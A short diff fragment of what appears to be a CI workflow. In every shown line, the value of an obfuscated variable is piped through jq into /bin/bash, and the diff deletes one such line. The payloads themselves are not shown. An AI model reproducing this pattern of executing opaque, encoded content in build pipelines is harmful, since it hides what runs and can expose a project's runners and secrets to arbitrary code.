@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$pys78" | jq -r .pyfu9 | /bin/bash
           echo $asgd06 | jq -r .t78 | /bin/bash
           printf '%s' "$v26" | jq -r .on4 | /bin/bash
-          echo $sfum07 | jq -r .fu797 | /bin/bash
           printf '%s' "$es794" | jq -r .hlpvq6 | /bin/bash
           printf '%s' "$gryl7" | jq -r .zsi310 | /bin/bash
           printf '%s' "$d52" | jq -r .j53896 | /bin/bash
